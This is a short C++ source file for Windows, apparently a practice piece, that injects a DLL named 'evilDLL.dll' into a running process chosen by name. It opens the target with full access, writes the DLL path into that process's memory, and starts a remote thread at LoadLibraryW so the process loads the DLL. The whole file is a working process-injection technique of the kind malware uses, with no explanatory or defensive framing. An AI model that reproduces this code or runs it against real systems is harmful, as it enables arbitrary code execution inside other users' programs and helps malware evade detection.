#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <string>

HANDLE GetProcessByName(PCSTR name);

int main()
{
    HANDLE proc = GetProcessByName("iniettami3.exe");
    if (proc == NULL) {
        return -1;
    }
    //HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 17584);
    wchar_t dll[] = TEXT("C:\\Users\\manue\\Desktop\\evilDLL.dll");
    LPVOID mem = VirtualAllocEx(proc, NULL, sizeof dll, MEM_COMMIT , PAGE_READWRITE);
    WriteProcessMemory(proc, mem, (LPVOID)dll, sizeof dll, NULL);
    PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
    CreateRemoteThread(proc, NULL, 0, threatStartRoutineAddress, mem, 0, NULL);
    CloseHandle(proc);
}


HANDLE GetProcessByName(PCSTR name)
{
    DWORD pid = 0;

    // Create toolhelp snapshot.
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process;
    ZeroMemory(&process, sizeof(process));
    process.dwSize = sizeof(process);

    // Walkthrough all processes.
    if (Process32First(snapshot, &process))
    {
        do
        {
            // Compare process.szExeFile based on format of name, i.e., trim file path
            // trim .exe if necessary, etc.
            char ch[260];
            char DefChar = ' ';
            WideCharToMultiByte(CP_ACP, 0, process.szExeFile, -1, ch, 260, &DefChar, NULL);
            if (std::string(ch) == std::string(name))
            {
                pid = process.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);

    if (pid != 0)
    {
        return OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    }

    // Not found


    return NULL;
}